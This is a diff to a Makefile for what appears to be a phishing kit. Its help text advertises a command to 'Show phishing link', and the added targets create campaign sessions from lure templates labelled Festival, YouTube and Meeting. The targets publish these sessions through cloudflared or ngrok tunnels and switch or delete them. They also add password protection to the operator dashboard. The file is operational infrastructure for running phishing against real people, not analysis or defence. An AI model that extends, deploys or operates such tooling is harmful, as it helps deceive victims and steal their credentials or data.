@@ -1,7 +1,9 @@
 .PHONY: help build build-all up down restart logs status link clean inspect rebase sbom \
         up-local up-self-hosted up-coolify up-ngrok up-cloudflared \
         proxy-caddy proxy-traefik proxy-nginx \
-        cf-dns cf-dns-delete
+        cf-dns cf-dns-delete \
+        session-list session-create session-switch session-delete \
+        auth-enable auth-disable auth-status
 
 include .env
 export
@@ -46,6 +48,17 @@ help:
 	@echo "  make link           Show phishing link"
 	@echo "  make clean          Remove all data and volumes"
 	@echo "  make shell          Open shell in app container"
+	@echo ""
+	@echo "SESSION MANAGEMENT:"
+	@echo "  make session-list   List all sessions"
+	@echo "  make session-create Create new session"
+	@echo "  make session-switch Switch active session"
+	@echo "  make session-delete Delete a session"
+	@echo ""
+	@echo "DASHBOARD AUTH:"
+	@echo "  make auth-enable    Enable HTTP Basic Auth"
+	@echo "  make auth-disable   Disable authentication"
+	@echo "  make auth-status    Check auth status"
 
 # =========================================================================
 # Pack Builds
@@ -171,3 +184,54 @@ clean:
 
 shell:
 	docker compose exec app bash
+
+# =========================================================================
+# Session Management
+# =========================================================================
+session-list:
+	@curl -s http://localhost:$(DASHBOARD_PORT)/api/sessions.php | jq '.'
+
+session-create:
+	@read -p "Session name: " sname; \
+	read -p "Template (1=Festival 2=YouTube 3=Meeting) [1]: " stpl; \
+	stpl=$${stpl:-1}; \
+	read -p "Tunnel (cloudflared/ngrok/none) [cloudflared]: " stun; \
+	stun=$${stun:-cloudflared}; \
+	curl -s -X POST http://localhost:$(DASHBOARD_PORT)/api/sessions.php \
+		-H 'Content-Type: application/json' \
+		-d "{\"action\":\"create\",\"name\":\"$$sname\",\"template\":$$stpl,\"tunnel\":\"$$stun\"}" | jq '.'
+
+session-switch:
+	@read -p "Session ID: " sid; \
+	curl -s -X POST http://localhost:$(DASHBOARD_PORT)/api/sessions.php \
+		-H 'Content-Type: application/json' \
+		-d "{\"action\":\"switch\",\"id\":\"$$sid\"}" | jq '.'
+
+session-delete:
+	@read -p "Session ID: " sid; \
+	curl -s -X POST http://localhost:$(DASHBOARD_PORT)/api/sessions.php \
+		-H 'Content-Type: application/json' \
+		-d "{\"action\":\"delete\",\"id\":\"$$sid\"}" | jq '.'
+
+# =========================================================================
+# Dashboard Authentication
+# =========================================================================
+auth-enable:
+	@read -p "Dashboard username: " duser; \
+	read -sp "Dashboard password: " dpass; \
+	echo ""; \
+	docker compose exec dashboard htpasswd -cb /data/config/.htpasswd "$$duser" "$$dpass"; \
+	echo "Auth enabled. Restarting dashboard..."; \
+	docker compose restart dashboard
+
+auth-disable:
+	@docker compose exec dashboard rm -f /data/config/.htpasswd; \
+	echo "Auth disabled. Restarting dashboard..."; \
+	docker compose restart dashboard
+
+auth-status:
+	@if docker compose exec dashboard test -f /data/config/.htpasswd 2>/dev/null; then \
+		echo "Dashboard auth: ENABLED"; \
+	else \
+		echo "Dashboard auth: DISABLED"; \
+	fi
